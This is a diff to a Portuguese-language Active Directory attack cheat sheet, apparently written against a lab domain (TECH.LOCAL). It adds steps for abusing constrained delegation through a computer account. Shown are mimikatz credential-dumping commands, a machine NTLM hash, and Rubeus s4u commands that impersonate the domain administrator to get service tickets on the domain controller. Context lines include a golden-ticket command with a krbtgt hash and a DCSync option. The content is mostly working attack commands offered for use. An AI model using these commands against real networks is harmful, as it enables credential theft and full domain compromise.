@@ -1453,7 +1453,21 @@ SOLICITAR TICKET PARA OUTROS SERVIÇOS
 ```
 rubeus.exe s4u /user:yamcha /rc4:1A9D94FDE4F369D53FA5515D1D6BEEE0 /impersonateuser:"administrator" /msdsspn:"cifs/TECH-DC01.TECH.LOCAL" /altservice:cifs,host,ldap /ptt 
 ```
-##### CONSTRAINED DELEGATION (USUARIO) - OPÇÕES DE ATAQUE
+##### CONSTRAINED DELEGATION (COMPUTADOR) - PEGAR A SENHA NTLM DO COMPUTADOR LSA SECRETS: SERVER02$ e219f089ce0807399b81ed7950c64e2b
+PEGAR O HASH DIRETO COM O MIMIKATZ:
+```
+Privilege::debug
+Sekurlsa::logonpasswords
+```
+##### CONSTRAINED DELEGATION (COMPUTADOR) - NO RUBEUS, SOLICITAR TGS PARA A MAQUINA QUE TEMOS ACESSO PARA OS SERVICOS AUTORIZADOS NO AD: (cifs/TECH-DC01.TECH.LOCAL)
+```
+rubeus.exe s4u /user:SERVER02$ /rc4:e219f089ce0807399b81ed7950c64e2b /impersonateuser:"administrator" /msdsspn:"cifs/TECH-DC01.TECH.LOCAL" /ptt
+```
+SOLICITAR TICKET PARA OUTROS SERVIÇOS
+```
+rubeus.exe s4u /user:SERVER02$ /rc4:e219f089ce0807399b81ed7950c64e2b /impersonateuser:"administrator" /msdsspn:"cifs/TECH-DC01.TECH.LOCAL" /altservice:host,http,wsman,rpcss,ldap,cifs /ptt
+```
+##### CONSTRAINED DELEGATION - OPÇÕES DE ATAQUE
 - OPÇÃO 1 - FAZER O ATAQUE DCSYNC
 
 OBTER TICKET LDAP:
@@ -1479,9 +1493,6 @@ enter-pssession -computername TECH-DC01.TECH.LOCAL
 ```
 kerberos::golden /User:vegeta /domain:tech.local /sid:S-1-5-21-4215187987-3124207031-433979976 /krbtgt:28ec87e3414d019c944786bf447fd666 id:500 /groups:512 /startoffset:0 /ending:600 /renewmax:10080 /ptt
 ```
-
-
-
 
 
 
